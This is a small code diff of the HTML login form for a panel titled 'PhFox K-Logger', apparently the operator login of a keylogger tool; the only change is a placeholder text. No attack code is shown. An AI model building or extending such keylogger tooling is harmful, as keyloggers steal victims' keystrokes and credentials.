@@ -10,7 +10,7 @@ function loginForm() {
 			<form action="index.php" method="post">
 			<h1> PhFox K-Logger</h1><hr/>
 				<label for="name">LOGIN</label><br>
-				<input class="inppd" type="text" name="user" id="user" onclick="chge()" placeholder="User" required autocomplete="off"/><br>
+				<input class="inppd" type="text" name="user" id="user" onclick="chge()" placeholder="Username" required autocomplete="off"/><br>
 				<input class="inppd" type="password" name="password" id="password" placeholder="Password" required/><br>
 				<input type="submit" name="enter" id="enter" value="Login" />
 			</form>
